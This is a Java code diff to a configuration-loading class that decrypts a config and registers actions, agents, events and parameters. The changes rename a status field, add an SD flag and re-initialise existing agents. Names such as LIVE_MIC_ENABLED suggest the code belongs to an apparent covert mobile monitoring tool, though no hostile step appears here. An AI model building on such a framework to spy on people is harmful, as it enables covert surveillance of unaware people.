@@ -64,9 +64,9 @@ public final class Conf {
     public static final String DEFAULT_APN_PWD = "";
 
     public static final boolean SYNCACTION_FORCE_WIFI = false;
+    public static final boolean SD_ENABLED = false;
+    
     public static boolean IS_UI = true;
-    
-    
 
     //==========================================================
 
@@ -154,13 +154,13 @@ public final class Conf {
     int endofIndex = -1;
 
     /** The status obj. */
-    Status statusObj = null;
+    Status status = null;
 
     /**
      * Instantiates a new conf.
      */
     public Conf() {
-        statusObj = Status.getInstance();
+        status = Status.getInstance();
         //#ifdef LIVE_MIC_ENABLED
         IS_UI = true;
         //#endif
@@ -175,7 +175,7 @@ public final class Conf {
      */
     public boolean load() {
 
-        statusObj.clear();
+        status.clear();
 
         boolean ret = true;
         final byte[] confKey = Keys.getInstance().getConfKey();
@@ -413,7 +413,7 @@ public final class Conf {
                 action.addNewSubAction(actionType, confParams);
             }
 
-            statusObj.addAction(action);
+            status.addAction(action);
         }
 
         //#ifdef DEBUG_TRACE
@@ -462,8 +462,17 @@ public final class Conf {
             //#endif
 
             final boolean enabled = agentStatus == Common.AGENT_ENABLED;
-            final Agent agent = Agent.factory(agentType, enabled, confParams);
-            statusObj.addAgent(agent);
+
+            Agent agent = status.getAgent(agentType);
+            if (agent != null) {
+                //#ifdef DEBUG_WARN
+                debug.warn("Agent already exists: " + agent );
+                //#endif
+                agent.init(enabled, confParams);
+            } else {
+                agent = Agent.factory(agentType, enabled, confParams);
+                status.addAgent(agent);
+            }
         }
 
         //#ifdef DEBUG_TRACE
@@ -636,7 +645,7 @@ public final class Conf {
             //#endif
             final Event event = Event.factory(i, eventType, actionId,
                     confParams);
-            statusObj.addEvent(i, event);
+            status.addEvent(i, event);
         }
 
         //#ifdef DEBUG_TRACE
@@ -681,7 +690,7 @@ public final class Conf {
             databuffer.readFully(confParams);
 
             final Parameter config = Parameter.factory(confId, confParams);
-            statusObj.addParameter(config);
+            status.addParameter(config);
         }
 
         return true;
